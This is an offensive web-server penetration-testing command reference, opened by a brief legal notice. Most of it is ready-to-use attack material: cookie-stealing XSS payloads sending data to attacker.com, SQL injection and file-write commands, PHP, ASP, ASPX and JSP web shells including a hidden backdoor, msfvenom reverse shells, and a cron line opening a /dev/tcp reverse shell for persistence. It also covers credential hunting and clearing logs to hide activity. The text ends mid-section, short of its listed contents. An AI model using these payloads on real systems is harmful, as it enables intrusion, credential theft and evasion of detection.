# Web Server Penetration Testing & Red Teaming
## Professional Command Reference — Complete Guide

> ⚠️ **Legal Notice:** These commands are for authorized security testing only.
> Never use on systems without explicit written permission. Unauthorized access is a criminal offence.

---

## Table of Contents

1. [Web Server Fingerprinting & Recon](#1-web-server-fingerprinting--recon)
2. [Directory & File Enumeration](#2-directory--file-enumeration)
3. [Vulnerability Scanning](#3-vulnerability-scanning)
4. [SSL/TLS Analysis](#4-ssltls-analysis)
5. [Web Application Attacks](#5-web-application-attacks)
6. [SQL Injection](#6-sql-injection)
7. [Authentication Attacks](#7-authentication-attacks)
8. [File Upload Attacks](#8-file-upload-attacks)
9. [Server-Side Vulnerabilities](#9-server-side-vulnerabilities)
10. [CMS Attacks (WordPress, Joomla, Drupal)](#10-cms-attacks)
11. [API Testing & Attacks](#11-api-testing--attacks)
12. [Web Shells & Backdoors](#12-web-shells--backdoors)
13. [Post-Exploitation on Web Server](#13-post-exploitation-on-web-server)
14. [Log Clearing & Covering Tracks](#14-log-clearing--covering-tracks)
15. [Serving Files from Kali (Attacker Infrastructure)](#15-serving-files-from-kali)
16. [Automated Scanning Pipelines](#16-automated-scanning-pipelines)

---

## 1. Web Server Fingerprinting & Recon

### Identify Server Technology
```bash
# Basic HTTP header grab
curl -I http://target.com
curl -I https://target.com
wget --server-response --spider http://target.com 2>&1 | head -30

# Verbose headers
curl -v http://target.com 2>&1 | grep -E "Server:|X-Powered-By:|Via:|X-AspNet"

# Netcat banner grab
nc -nv 192.168.1.10 80
# Then type: GET / HTTP/1.0  [Enter][Enter]

# Identify WAF (Web Application Firewall)
wafw00f http://target.com
wafw00f -a http://target.com              # Test all WAF signatures
wafw00f -l                                # List detectable WAFs

# WhatWeb — fingerprint technologies
whatweb http://target.com
whatweb -v http://target.com              # Verbose
whatweb -a 3 http://target.com            # Aggressive mode
whatweb --log-json=whatweb.json http://target.com

# Wappalyzer CLI
wappalyzer http://target.com

# Shodan (passive — no direct contact)
shodan search "hostname:target.com"
shodan host 1.2.3.4
shodan search 'http.title:"Admin Panel" country:US'
shodan search 'Apache/2.4.49'             # Find vulnerable version globally

# Check HTTP methods allowed
curl -X OPTIONS http://target.com -v
nmap --script http-methods target.com
nmap --script http-methods --script-args http-methods.url-path='/api/' target.com

# Check for PUT method (dangerous if enabled)
curl -X PUT http://target.com/test.txt -d "test"
```

### DNS & Infrastructure Recon
```bash
# Full DNS enumeration
dig target.com ANY
dig target.com A
dig target.com MX
dig target.com NS
dig target.com TXT
dig +short target.com

# Reverse DNS
dig -x 1.2.3.4
host 1.2.3.4

# Zone transfer attempt
dig axfr @ns1.target.com target.com
dnsrecon -d target.com -t axfr
fierce --domain target.com

# Subdomain enumeration
subfinder -d target.com -o subs.txt
amass enum -d target.com -o amass_subs.txt
assetfinder --subs-only target.com
dnsx -l subs.txt -a -resp                # Resolve all subdomains

# Find subdomains via certificate transparency
curl "https://crt.sh/?q=%.target.com&output=json" | jq -r '.[].name_value' | sort -u

# Probe which subdomains are alive
cat subs.txt | httprobe | tee alive_subs.txt
httpx -l subs.txt -status-code -title -tech-detect -o httpx_results.txt

# Virtual host discovery (find hidden vhosts on same IP)
gobuster vhost -u http://192.168.1.10 -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
ffuf -u http://192.168.1.10 -H "Host: FUZZ.target.com" \
     -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -fc 302,404
```

### Passive URL & Endpoint Discovery
```bash
# Wayback Machine
waybackurls target.com | tee wayback.txt
waybackurls target.com | grep -E "\.php|\.asp|\.jsp|\.json|admin|login|api"

# GAU (Get All URLs)
gau target.com | tee gau.txt
gau target.com | grep "?"                 # Only URLs with parameters

# Extract all JS files (may contain API endpoints, secrets)
cat alive_subs.txt | getJS --complete | tee js_files.txt

# Find secrets in JS files
python3 secretfinder.py -i http://target.com/app.js -o cli
trufflehog filesystem ./js_files/

# Google dorks (manual)
site:target.com filetype:php
site:target.com inurl:admin
site:target.com inurl:login
site:target.com intitle:"index of"
site:target.com ext:sql OR ext:bak OR ext:env OR ext:log
site:target.com "DB_PASSWORD" OR "api_key" OR "secret"
```

---

## 2. Directory & File Enumeration

### Gobuster
```bash
# Basic directory brute force
gobuster dir -u http://target.com -w /usr/share/wordlists/dirb/common.txt

# With file extensions
gobuster dir -u http://target.com \
  -w /usr/share/seclists/Discovery/Web-Content/raft-large-files.txt \
  -x php,html,txt,bak,zip,sql,json,xml,asp,aspx,jsp \
  -t 50 -o gobuster_results.txt

# HTTPS with self-signed cert
gobuster dir -u https://target.com -w wordlist.txt -k

# With authentication
gobuster dir -u http://target.com -w wordlist.txt \
  -U admin -P password
gobuster dir -u http://target.com -w wordlist.txt \
  -H "Authorization: Bearer TOKEN"

# With cookies
gobuster dir -u http://target.com -w wordlist.txt \
  -c "session=abc123; auth=xyz"

# DNS subdomain brute force
gobuster dns -d target.com -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt

# Virtual host discovery
gobuster vhost -u http://target.com -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
```

### FFUF (Fast Web Fuzzer)
```bash
# Directory fuzzing
ffuf -u http://target.com/FUZZ -w /usr/share/wordlists/dirb/common.txt

# Filter by status code
ffuf -u http://target.com/FUZZ -w wordlist.txt -fc 404,403

# Filter by response size
ffuf -u http://target.com/FUZZ -w wordlist.txt -fs 1234

# File extension fuzzing
ffuf -u http://target.com/indexFUZZ -w /usr/share/seclists/Fuzzing/extensions-most-common.fuzz.txt

# Parameter fuzzing (GET)
ffuf -u "http://target.com/page?FUZZ=value" -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt

# Parameter value fuzzing
ffuf -u "http://target.com/page?id=FUZZ" -w /usr/share/seclists/Fuzzing/LFI/LFI-LFISuite-pathtotest.txt

# POST body fuzzing
ffuf -u http://target.com/login -X POST \
  -d "username=admin&password=FUZZ" \
  -w /usr/share/wordlists/rockyou.txt \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -fc 401

# Multiple wordlists (clusterbomb)
ffuf -u http://target.com/FUZZ1/FUZZ2 -w wordlist1.txt:FUZZ1 -w wordlist2.txt:FUZZ2

# JSON output
ffuf -u http://target.com/FUZZ -w wordlist.txt -of json -o ffuf_results.json

# Rate limiting to avoid detection
ffuf -u http://target.com/FUZZ -w wordlist.txt -rate 50
```

### Feroxbuster (Recursive)
```bash
# Recursive directory scan
feroxbuster -u http://target.com -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt

# With extensions, recursive
feroxbuster -u http://target.com \
  -w /usr/share/seclists/Discovery/Web-Content/raft-large-files.txt \
  -x php,html,txt,bak -d 3 -t 50

# Filter status codes
feroxbuster -u http://target.com -w wordlist.txt --filter-status 404,403

# With headers (cookies/auth)
feroxbuster -u http://target.com -w wordlist.txt \
  -H "Cookie: session=abc123" \
  -H "Authorization: Bearer TOKEN"
```

### Dirsearch
```bash
dirsearch -u http://target.com
dirsearch -u http://target.com -e php,html,txt,bak,zip
dirsearch -u http://target.com -w /usr/share/wordlists/dirb/big.txt
dirsearch -u http://target.com --exclude-status 403,404
```

---

## 3. Vulnerability Scanning

### Nikto
```bash
# Basic web server scan
nikto -h http://target.com

# HTTPS
nikto -h https://target.com -ssl

# Specific port
nikto -h target.com -p 8080

# Scan multiple hosts
nikto -h hosts.txt

# Save output
nikto -h http://target.com -o nikto_results.html -Format html
nikto -h http://target.com -o nikto_results.txt

# Tuning (specific checks)
nikto -h http://target.com -Tuning 9     # SQL injection
nikto -h http://target.com -Tuning 2     # Auth issues
nikto -h http://target.com -Tuning x 6  # Exclude DoS tests

# Ignore SSL errors
nikto -h https://target.com -ssl -nossl

# With authentication
nikto -h http://target.com -id admin:password

# Use proxy (for Burp)
nikto -h http://target.com -useproxy http://127.0.0.1:8080
```

### Nuclei
```bash
# Install/update templates
nuclei -update-templates

# Scan single target
nuclei -u https://target.com

# Specific template categories
nuclei -u https://target.com -t cves/
nuclei -u https://target.com -t vulnerabilities/
nuclei -u https://target.com -t exposures/
nuclei -u https://target.com -t misconfiguration/
nuclei -u https://target.com -t technologies/

# Severity filter
nuclei -u https://target.com -severity critical,high
nuclei -u https://target.com -severity medium,low

# Scan list of URLs
nuclei -l urls.txt -t cves/ -o nuclei_results.txt

# With rate limiting (stealth)
nuclei -u https://target.com -rate-limit 10 -timeout 10

# Custom header (with auth)
nuclei -u https://target.com -H "Authorization: Bearer TOKEN"

# JSON output
nuclei -u https://target.com -json -o nuclei.json

# Exclude templates
nuclei -u https://target.com -exclude-tags dos,fuzz
```

### Nmap Web Scripts
```bash
nmap --script http-enum target.com
nmap --script http-headers target.com
nmap --script http-methods target.com
nmap --script http-auth-finder target.com
nmap --script http-config-backup target.com
nmap --script http-userdir-enum target.com
nmap --script http-shellshock target.com
nmap --script http-php-version target.com
nmap --script http-wordpress-enum target.com
nmap --script http-sql-injection target.com
nmap --script http-xssed target.com
nmap --script ssl-heartbleed target.com
nmap --script ssl-poodle target.com
nmap --script http-vuln-cve2017-5638 target.com   # Apache Struts
nmap -sV --script vuln -p 80,443,8080,8443 target.com
```

---

## 4. SSL/TLS Analysis

```bash
# Testssl.sh — comprehensive TLS check
testssl.sh https://target.com
testssl.sh --severity HIGH https://target.com
testssl.sh --heartbleed https://target.com
testssl.sh --beast https://target.com
testssl.sh --breach https://target.com
testssl.sh --poodle https://target.com
testssl.sh --json testssl_results.json https://target.com

# SSLyze
sslyze target.com
sslyze --regular target.com
sslyze --json_out=sslyze.json target.com

# OpenSSL checks
openssl s_client -connect target.com:443
openssl s_client -connect target.com:443 -tls1   # Force TLS 1.0
openssl s_client -connect target.com:443 -ssl3    # Force SSLv3 (POODLE)

# View certificate details
openssl s_client -connect target.com:443 2>/dev/null | openssl x509 -noout -text

# Heartbleed test
python heartbleed.py target.com -p 443

# Check cipher suites
nmap --script ssl-enum-ciphers -p 443 target.com

# Check for weak ciphers
sslscan target.com:443
```

---

## 5. Web Application Attacks

### Burp Suite Professional Workflow
```bash
# Launch Burp
burpsuite &
# Set browser proxy: 127.0.0.1:8080
# Install Burp CA cert: http://burp → CA Certificate

# Key Burp workflows:
# 1. Proxy → Intercept ON → browse target → analyze requests
# 2. Right-click request → Send to Repeater → modify & resend
# 3. Right-click request → Send to Intruder → set attack positions
# 4. Intruder → Attack Type:
#    - Sniper:      one payload set, one position
#    - Battering:   one payload set, all positions simultaneously
#    - Pitchfork:   multiple payload sets, one per position (parallel)
#    - Clusterbomb: multiple payload sets, all combinations

# Burp extensions (BApp Store):
# - Active Scan++
# - Autorize (auth testing)
# - JWT Editor
# - Param Miner (discover hidden params)
# - Turbo Intruder (fast brute force)
# - Logger++
```

### XSS (Cross-Site Scripting)
```bash
# Basic payloads
<script>alert(1)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
"><script>alert(1)</script>
'><script>alert(1)</script>
javascript:alert(1)
<iframe src="javascript:alert(1)">
<body onload=alert(1)>
<input autofocus onfocus=alert(1)>
<details open ontoggle=alert(1)>

# Filter bypass payloads
<ScRiPt>alert(1)</ScRiPt>
<script>alert`1`</script>
<script>alert(String.fromCharCode(88,83,83))</script>
<img src=x onerror=&#97;&#108;&#101;&#114;&#116;(1)>
<svg/onload=alert(1)>
<<script>alert(1)//<</script>

# Steal cookies
<script>document.location='http://attacker.com/steal?c='+document.cookie</script>
<img src=x onerror="fetch('http://attacker.com/?c='+btoa(document.cookie))">

# XSS Hunter (blind XSS)
# Register at xsshunter.com and use their payload

# Stored XSS in different contexts
# In HTML: <script>alert(1)</script>
# In attribute: " onmouseover="alert(1)
# In JavaScript: ';alert(1)//
# In href: javascript:alert(1)

# Tools
dalfox url "http://target.com/search?q=FUZZ"
dalfox file urls.txt
xsser --url "http://target.com/page?param=XSS"
```

### CSRF (Cross-Site Request Forgery)
```bash
# Check for CSRF token in forms
# Look for: <input type="hidden" name="csrf_token" value="...">

# Test if token is validated
# 1. Capture request in Burp
# 2. Remove token or use another user's token
# 3. If request succeeds → CSRF vulnerability

# Generate CSRF PoC (Burp: right-click → Engagement tools → Generate CSRF PoC)

# CSRF PoC HTML template
cat > csrf_poc.html << 'EOF'
<html>
<body>
<form action="http://target.com/change-email" method="POST">
  <input type="hidden" name="email" value="attacker@evil.com">
  <input type="submit" value="Click me">
</form>
<script>document.forms[0].submit();</script>
</body>
</html>
EOF
```

### IDOR (Insecure Direct Object Reference)
```bash
# Manual testing
# Change user ID in URL: /profile?id=123 → /profile?id=124
# Change in body: {"user_id": 123} → {"user_id": 124}
# Try other users' IDs, admin ID (1, 0, -1)

# Use Burp Intruder with number range payload
# Position: /api/user/§123§/profile
# Payload: Numbers 1-1000

# Autorize extension (Burp) — automated IDOR testing
# Install → configure low-priv user cookie → browse as admin → Autorize compares responses

# FFUF for IDOR
ffuf -u "http://target.com/api/user/FUZZ/profile" \
     -w <(seq 1 1000) \
     -H "Cookie: session=low_priv_cookie" \
     -fc 403,404
```

---

## 6. SQL Injection

### Manual Detection
```bash
# In URL parameter
http://target.com/page?id=1'
http://target.com/page?id=1''
http://target.com/page?id=1 AND 1=1
http://target.com/page?id=1 AND 1=2
http://target.com/page?id=1 ORDER BY 1--
http://target.com/page?id=1 ORDER BY 10--    # Increase until error = column count

# UNION-based (after finding column count)
http://target.com/page?id=1 UNION SELECT NULL,NULL,NULL--
http://target.com/page?id=-1 UNION SELECT 1,2,3--
http://target.com/page?id=-1 UNION SELECT 1,database(),user()--
http://target.com/page?id=-1 UNION SELECT 1,table_name,3 FROM information_schema.tables WHERE table_schema=database()--

# Time-based blind (MySQL)
http://target.com/page?id=1 AND SLEEP(5)--
http://target.com/page?id=1'; WAITFOR DELAY '0:0:5'--    # MSSQL

# Boolean-based blind
http://target.com/page?id=1 AND 1=1--    # True condition
http://target.com/page?id=1 AND 1=2--    # False condition

# Error-based
http://target.com/page?id=1 AND extractvalue(1,concat(0x7e,database()))--
```

### SQLmap
```bash
# Basic scan
sqlmap -u "http://target.com/page?id=1"

# Enumerate databases
sqlmap -u "http://target.com/page?id=1" --dbs

# Enumerate tables
sqlmap -u "http://target.com/page?id=1" -D dbname --tables

# Dump table
sqlmap -u "http://target.com/page?id=1" -D dbname -T users --dump

# Dump all
sqlmap -u "http://target.com/page?id=1" --dump-all

# POST request
sqlmap -u "http://target.com/login" \
  --data="username=admin&password=pass" \
  --method POST -p username

# From Burp saved request
sqlmap -r request.txt

# High level and risk
sqlmap -u "http://target.com/page?id=1" --level 5 --risk 3

# Bypass WAF
sqlmap -u "http://target.com/page?id=1" --tamper=space2comment
sqlmap -u "http://target.com/page?id=1" --tamper=randomcase
sqlmap -u "http://target.com/page?id=1" --tamper=charencode,space2comment,randomcase

# OS interaction (if DBA rights)
sqlmap -u "http://target.com/page?id=1" --os-shell
sqlmap -u "http://target.com/page?id=1" --file-read="/etc/passwd"
sqlmap -u "http://target.com/page?id=1" --file-write="/tmp/shell.php" --file-dest="/var/www/html/shell.php"

# Specify DBMS
sqlmap -u "http://target.com/page?id=1" --dbms=mysql
sqlmap -u "http://target.com/page?id=1" --dbms=mssql

# Cookie injection
sqlmap -u "http://target.com/page" --cookie="id=1" -p id

# Header injection
sqlmap -u "http://target.com/" --headers="X-Forwarded-For: *"

# Authenticated scan
sqlmap -u "http://target.com/page?id=1" --cookie="session=abc123"

# Tor proxy
sqlmap -u "http://target.com/page?id=1" --tor --tor-type=SOCKS5
```

---

## 7. Authentication Attacks

### Brute Force & Password Spraying
```bash
# Hydra — web form brute force
hydra -l admin -P /usr/share/wordlists/rockyou.txt \
  http-post-form "target.com/login:username=^USER^&password=^PASS^:Invalid credentials"

hydra -l admin -P rockyou.txt \
  http-get-form "target.com/admin:user=^USER^&pass=^PASS^:F=401"

# Hydra — HTTP Basic Auth
hydra -l admin -P rockyou.txt http-get://target.com/admin/

# Medusa
medusa -h target.com -u admin -P rockyou.txt -M http -m DIR:/admin -m FORM:username=^USER^:password=^PASS^

# FFUF brute force
ffuf -u http://target.com/login -X POST \
  -d "username=admin&password=FUZZ" \
  -w /usr/share/wordlists/rockyou.txt \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -fc 401 -fs 1234

# CrackMapExec (web)
crackmapexec http target.com -u admin -p rockyou.txt --path /admin
```

### JWT Attacks
```bash
# Decode JWT (base64)
echo "eyJhbGciOiJIUzI1NiJ9" | base64 -d
echo "eyJ1c2VyIjoiYWRtaW4ifQ" | base64 -d

# jwt_tool — comprehensive JWT testing
jwt_tool TOKEN
jwt_tool TOKEN -T                          # Tamper mode
jwt_tool TOKEN -X a                        # alg:none attack
jwt_tool TOKEN -X s                        # Self-signed RSA
jwt_tool TOKEN -C -d rockyou.txt           # Crack secret key
jwt_tool TOKEN -I -pc role -pv admin       # Inject claim

# Manual alg:none attack
# 1. Decode header: {"alg":"HS256","typ":"JWT"}
# 2. Change to:     {"alg":"none","typ":"JWT"}
# 3. Encode header (no signature needed)
# Modified JWT: base64(header).base64(payload).

# Hashcat JWT crack
hashcat -m 16500 jwt_hash.txt rockyou.txt
```

### Default Credentials
```bash
# Common default creds to try:
# admin:admin, admin:password, admin:123456
# root:root, root:toor, root:password
# administrator:password, guest:guest

# Default creds database
# https://github.com/ihebski/DefaultCreds-cheat-sheet
defaultcreds-cheat-sheet search apache
```

---

## 8. File Upload Attacks

```bash
# Basic PHP web shell (upload as shell.php)
cat > shell.php << 'EOF'
<?php system($_GET['cmd']); ?>
EOF

# If only image extensions allowed — try:
mv shell.php shell.php.jpg
mv shell.php shell.pHP              # Case variation
mv shell.php shell.php%00.jpg       # Null byte (old servers)
mv shell.php shell.php;.jpg         # Semicolon bypass
mv shell.php shell.phtml
mv shell.php shell.pht
mv shell.php shell.php5
mv shell.php shell.shtml

# Double extension
mv shell.php shell.jpg.php

# Alternate PHP shells
echo '<?php passthru($_GET["c"]); ?>' > shell.php
echo '<?php echo shell_exec($_GET["cmd"]); ?>' > shell.php
echo '<?php $cmd=$_GET["cmd"]; $output=array(); exec($cmd,$output); echo implode("\n",$output); ?>' > shell.php

# EXIF injection (embed PHP in image metadata)
exiftool -Comment='<?php system($_GET["cmd"]); ?>' image.jpg
mv image.jpg image.php.jpg

# Bypass content-type check in Burp:
# Change Content-Type: application/php → image/jpeg in upload request

# SVG XSS
cat > xss.svg << 'EOF'
<?xml version="1.0" standalone="no"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
<svg version="1.1" xmlns="http://www.w3.org/2000/svg">
<script type="text/javascript">alert("XSS");</script>
</svg>
EOF

# .htaccess upload (if Apache, upload to set PHP execution)
echo 'AddType application/x-httpd-php .jpg' > .htaccess
# Then upload shell.jpg and it executes as PHP

# Use Weevely for stealthy PHP shell
weevely generate password123 shell.php
weevely http://target.com/uploads/shell.php password123
```

---

## 9. Server-Side Vulnerabilities

### LFI (Local File Inclusion)
```bash
# Basic LFI payloads
http://target.com/page?file=../../../../etc/passwd
http://target.com/page?file=../../../../etc/shadow
http://target.com/page?file=../../../../etc/hosts
http://target.com/page?file=../../../../proc/self/environ
http://target.com/page?file=../../../../var/log/apache2/access.log   # Log poisoning
http://target.com/page?file=../../../../windows/win.ini
http://target.com/page?file=../../../../windows/system32/drivers/etc/hosts

# PHP wrappers
http://target.com/page?file=php://filter/convert.base64-encode/resource=index.php
http://target.com/page?file=php://input           # With POST body: <?php system('id'); ?>
http://target.com/page?file=data://text/plain,<?php system('id');?>
http://target.com/page?file=expect://id
http://target.com/page?file=zip://shell.zip%23shell.php

# Log poisoning → RCE
# 1. Poison the log with PHP code via User-Agent:
curl -A "<?php system(\$_GET['cmd']); ?>" http://target.com/
# 2. Then include the log via LFI:
http://target.com/page?file=../../../../var/log/apache2/access.log&cmd=id

# Null byte bypass (PHP < 5.3.4)
http://target.com/page?file=../../../../etc/passwd%00

# Path traversal with encoding
http://target.com/page?file=..%2F..%2F..%2Fetc%2Fpasswd
http://target.com/page?file=....//....//etc/passwd

# LFI scanner
python lfimap.py -U "http://target.com/page?file=LFI" --lfi
wfuzz -c -w /usr/share/seclists/Fuzzing/LFI/LFI-LFISuite-pathtotest.txt \
      --hc 404 "http://target.com/page?file=FUZZ"
```

### RFI (Remote File Inclusion)
```bash
# Host malicious file on attacker
echo '<?php system($_GET["cmd"]); ?>' > shell.php
python3 -m http.server 80

# RFI payload
http://target.com/page?file=http://attacker.com/shell.php&cmd=id
http://target.com/page?file=\\\\attacker.com\\share\\shell.php   # Windows UNC
```

### SSRF (Server-Side Request Forgery)
```bash
# Basic SSRF
http://target.com/fetch?url=http://127.0.0.1:22
http://target.com/fetch?url=http://127.0.0.1:80/admin
http://target.com/fetch?url=http://192.168.1.1/            # Internal network
http://target.com/fetch?url=http://169.254.169.254/         # AWS metadata
http://target.com/fetch?url=http://169.254.169.254/latest/meta-data/
http://target.com/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/
http://target.com/fetch?url=http://metadata.google.internal/  # GCP
http://target.com/fetch?url=http://169.254.169.254/metadata/instance  # Azure

# SSRF bypass techniques
# Using different IP representations
http://target.com/fetch?url=http://0x7f000001/       # Hex for 127.0.0.1
http://target.com/fetch?url=http://2130706433/       # Decimal for 127.0.0.1
http://target.com/fetch?url=http://127.0.0.1.nip.io/
http://target.com/fetch?url=http://[::1]/            # IPv6 localhost
http://target.com/fetch?url=http://localhost/

# Protocol attacks via SSRF
http://target.com/fetch?url=file:///etc/passwd
http://target.com/fetch?url=dict://127.0.0.1:11211/   # Memcached
http://target.com/fetch?url=gopher://127.0.0.1:6379/  # Redis

# Tools
ssrfmap.py -r request.txt -p url
gopherus --exploit redis                  # Generate gopher payloads
```

### XXE (XML External Entity)
```bash
# Basic XXE payload (in XML body)
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<root><data>&xxe;</data></root>

# SSRF via XXE
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://attacker.com/">]>
<root><data>&xxe;</data></root>

# Blind XXE (exfiltrate via DNS)
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd">%xxe;]>
<root/>

# SSTI (Server-Side Template Injection)
# Test payloads:
{{7*7}}          # Should output 49 — confirms Jinja2/Twig
${7*7}           # FreeMarker / Thymeleaf
<%= 7*7 %>       # ERB (Ruby)
#{7*7}           # Ruby
*{7*7}           # Spring (Java)

# RCE via SSTI (Jinja2 — Python)
{{config.__class__.__init__.__globals__['os'].popen('id').read()}}
{{''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read()}}

# Tplmap — automated SSTI
tplmap -u "http://target.com/page?name=*"
tplmap -u "http://target.com/page?name=*" --os-shell
```

### Command Injection
```bash
# Test payloads (append to parameter value)
; id
| id
|| id
& id
&& id
`id`
$(id)
; sleep 5
| sleep 5
%0a id                                    # URL-encoded newline

# Blind command injection — time-based
; sleep 10
| ping -c 10 127.0.0.1
; curl http://attacker.com/$(id)          # Out-of-band

# OS command injection tools
commix --url="http://target.com/page?ip=127.0.0.1" --level=3
commix --url="http://target.com/page" --data="ip=127.0.0.1&submit=Submit"
```

---

## 10. CMS Attacks

### WordPress
```bash
# WPScan — comprehensive WordPress scanner
wpscan --url http://target.com
wpscan --url http://target.com --enumerate u        # Users
wpscan --url http://target.com --enumerate p        # Plugins
wpscan --url http://target.com --enumerate t        # Themes
wpscan --url http://target.com --enumerate vp       # Vulnerable plugins
wpscan --url http://target.com --enumerate ap       # All plugins

# Brute force login
wpscan --url http://target.com --usernames admin \
  --passwords /usr/share/wordlists/rockyou.txt

# With API token (more vuln data)
wpscan --url http://target.com --api-token TOKEN --enumerate vp

# Manual checks
curl http://target.com/wp-login.php
curl http://target.com/wp-admin/
curl http://target.com/xmlrpc.php         # XML-RPC enabled = brute force vector
curl http://target.com/wp-json/wp/v2/users  # User enumeration via REST API
curl http://target.com/?author=1          # User enum via author ID

# WordPress admin → RCE
# 1. Login to wp-admin
# 2. Appearance → Editor → 404.php → inject PHP shell
# 3. Access: http://target.com/wp-content/themes/THEME/404.php?cmd=id
```

### Joomla
```bash
joomscan -u http://target.com
joomscan -u http://target.com --enumerate-components
droopescan scan joomla -u http://target.com
```

### Drupal
```bash
droopescan scan drupal -u http://target.com
# Drupalgeddon2 (CVE-2018-7600)
python drupalgeddon2.py http://target.com
```

---

## 11. API Testing & Attacks

```bash
# Discover API endpoints
ffuf -u http://target.com/api/FUZZ -w /usr/share/seclists/Discovery/Web-Content/api/objects.txt
ffuf -u http://target.com/FUZZ/v1/users -w /usr/share/seclists/Discovery/Web-Content/common.txt

# API versioning attacks
http://target.com/api/v2/users → try /api/v1/users (older, less secured)
http://target.com/api/v3/admin → try /api/v2/admin, /api/v1/admin

# Mass assignment
# POST /api/user/update
# Add: "role":"admin", "isAdmin":true, "premium":true

# BOLA/IDOR on API
GET /api/users/123/orders → try /api/users/124/orders
DELETE /api/messages/456 → try different IDs

# GraphQL enumeration
# Introspection query
curl -X POST http://target.com/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{ __schema { types { name } } }"}'

# GraphQL introspection full
curl -X POST http://target.com/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{ __schema { queryType { fields { name description } } } }"}'

# GraphQL tools
graphw00f -f -t http://target.com/graphql   # Fingerprint GraphQL engine
clairvoyance http://target.com/graphql      # Schema recovery without introspection

# REST API tools
arjun -u http://target.com/api/endpoint -m GET    # Discover hidden params
arjun -u http://target.com/api/endpoint -m POST

# Postman / REST client for manual API testing
# Use Burp proxy with Postman: Settings → Proxy → 127.0.0.1:8080
```

---

## 12. Web Shells & Backdoors

```bash
# Simple PHP web shells
echo '<?php system($_GET["cmd"]); ?>' > c.php
echo '<?php passthru($_REQUEST["c"]); ?>' > p.php
echo '<?php @eval($_POST["cmd"]); ?>' > e.php       # PHP eval shell

# More stealthy
cat > stealthy.php << 'EOF'
<?php
if(isset($_COOKIE['backdoor'])) {
  system(base64_decode($_POST['c']));
}
?>
EOF

# ASP web shell
echo '<% Response.Write(CreateObject("WScript.Shell").Exec(Request("cmd")).StdOut.ReadAll()) %>' > shell.asp

# ASPX shell
cat > shell.aspx << 'EOF'
<%@ Page Language="C#" %>
<% Response.Write(new System.Diagnostics.Process(){StartInfo=new System.Diagnostics.ProcessStartInfo("cmd.exe","/c "+Request["c"]){RedirectStandardOutput=true,UseShellExecute=false}}.Start()?new System.IO.StreamReader(new System.Diagnostics.Process(){StartInfo=new System.Diagnostics.ProcessStartInfo("cmd.exe","/c "+Request["c"]){RedirectStandardOutput=true,UseShellExecute=false}}.Start().StandardOutput).ReadToEnd():""); %>
EOF

# JSP shell
cat > shell.jsp << 'EOF'
<%= Runtime.getRuntime().exec(request.getParameter("cmd")) %>
EOF

# Weevely (stealth PHP backdoor)
weevely generate secretpassword /tmp/weevely.php
weevely http://target.com/uploads/weevely.php secretpassword
# Inside weevely: :help, :shell_sh, :file_download, :net_ifconfig

# MSFvenom web shells
msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.1.5 LPORT=4444 -f raw > meterpreter.php
msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.1.5 LPORT=4444 -f raw > shell.jsp
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.5 LPORT=4444 -f aspx > shell.aspx

# China Chopper (compact webshell)
echo '<?php @eval($_POST[cmd]);?>' > chopper.php
# Connect with client tool

# Shell usage
curl "http://target.com/shell.php?cmd=id"
curl "http://target.com/shell.php?cmd=cat+/etc/passwd"
curl "http://target.com/shell.php?cmd=ls+-la+/var/www/html"
```

---

## 13. Post-Exploitation on Web Server

```bash
# Enumerate web server environment
id; whoami; hostname
cat /etc/passwd | grep -v nologin
cat /etc/os-release
uname -a
ps aux | grep -E "apache|nginx|php|mysql"
env | grep -E "DB|PASS|SECRET|KEY|TOKEN"

# Find config files with credentials
find /var/www -name "*.php" -exec grep -l "password\|passwd\|DB_PASS" {} \;
find /var/www -name "config.php" 2>/dev/null
find /var/www -name ".env" 2>/dev/null
find /var/www -name "wp-config.php" 2>/dev/null
cat /var/www/html/wp-config.php | grep -E "DB_|table_prefix"

# Database access (using found credentials)
mysql -u dbuser -p -h localhost dbname
mysqldump -u dbuser -p dbname > dump.sql

# Find SSH keys
find / -name "id_rsa" 2>/dev/null
find / -name "authorized_keys" 2>/dev/null
cat ~/.ssh/id_rsa

# Check sudo rights
sudo -l

# Writable directories (for dropping files)
find /var/www -writable -type d 2>/dev/null
find /tmp -writable -type d 2>/dev/null

# Active network connections (find DB servers, internal hosts)
ss -tulnp
netstat -tulnp
cat /etc/hosts
ip route

# Crontabs (for persistence or privesc)
crontab -l
cat /etc/crontab
ls /etc/cron.*

# Persistence via cron
echo "* * * * * /bin/bash -c 'bash -i >& /dev/tcp/192.168.1.5/4444 0>&1'" >> /var/spool/cron/www-data

# Lateral movement — use DB creds to pivot
mysql -h 192.168.2.50 -u root -p'found_password'
```

---

## 14. Log Clearing & Covering Tracks

```bash
# Clear Apache/Nginx logs (requires root/write access)
echo "" > /var/log/apache2/access.log
echo "" > /var/log/apache2/error.log
echo "" > /var/log/nginx/access.log
echo "" > /var/log/nginx/error.log

# Clear auth logs
echo "" > /var/log/auth.log
echo "" > /var/log/secure

# Remove specific lines from log (your IP)
sed -i '/192.168.1.5/d' /var/log/apache2/access.log

# Modify file timestamps (timestomping)
touch -t 202301011200.00 shell.php        # Set to Jan 1 2023 12:00

# Clear bash history
history -c && history -w
echo "" > ~/.bash_history
export HISTSIZE=0
unset HISTFILE

# Use unshare to avoid logging
